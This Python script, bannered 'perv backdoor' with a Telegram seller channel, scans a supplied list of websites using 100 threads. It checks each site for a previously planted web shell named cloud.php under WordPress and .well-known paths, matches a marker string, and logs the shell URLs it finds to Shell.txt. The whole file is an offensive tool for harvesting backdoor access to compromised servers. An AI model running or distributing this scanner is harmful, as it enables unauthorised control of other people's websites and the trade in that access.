import sys
import requests
import re
import random
import string
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN

banner = '''
[#] Create By ::
Y88b   d88P 8888888888 8888888b.   .d88888b.   .d88888b. 88888888888 
 Y88b d88P        d88P 888   Y88b d88P" "Y88b d88P" "Y88b    888     
  Y88o88P        d88P  888    888 888     888 888     888    888     
   Y888P        d88P   888   d88P 888     888 888     888    888     
   d888b     88888888  8888888P"  888     888 888     888    888     
  d88888b     d88P     888 T88b   888     888 888     888    888     
 d88P Y88b   d88P      888  T88b  Y88b. .d88P Y88b. .d88P    888     
d88P   Y88b d88P       888   T88b  "Y88888P"   "Y88888P"     888
          ############## perv backdoor ##############                                                                     		 
	    Telegram Channels => https://t.me/x7seller						   
\n'''.format(fr)
print(banner)

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

Pathlist = [
    '/.well-known/pki-validation/cloud.php', '/.well-known/acme-challenge/cloud.php', '/wp-admin/network/cloud.php', '/cloud.php',
    '/cgi-bin/cloud.php', '/css/cloud.php', '/wp-admin/user/cloud.php', '/img/cloud.php', '/wp-admin/css/colors/coffee/cloud.php',
    '/wp-admin/images/cloud.php', '/images/cloud.php', '/wp-admin/js/widgets/cloud.php',
    '/wp-admin/css/colors/cloud.php', '/wp-admin/includes/cloud.php', '/wp-admin/css/colors/blue/cloud.php', '/wp-admin/cloud.php'
]

class EvaiLCode:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'
        }
    
    def URLdomain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://","")
        elif site.startswith("https://"):
            site = site.replace("https://","")
        else:
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern,site):
            sitez = re.findall(pattern,site)
            site = sitez[0]
        return site
        
    def checker(self, site):
        try:
            url = "http://" + self.URLdomain(site)
            for Path in Pathlist:
                check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
                if "Shell Bypass 403 GE-C666C" in check:
                    print('Target:{} --> {}[Succefully]'.format(url, fg))
                    open('Shell.txt', 'a').write(url + Path + "\n")
                    break
                else:
                    print('Target:{} -->! {}[Failid]'.format(url, fr))
        except Exception as e:
            print('Target:{} -->! {}[Error] {}'.format(url, fr, str(e)))

Control = EvaiLCode()

def RunUploader(site):
    try:
        Control.checker(site)
    except:
        pass

mp = Pool(100)
mp.map(RunUploader, target)
mp.close()
mp.join()
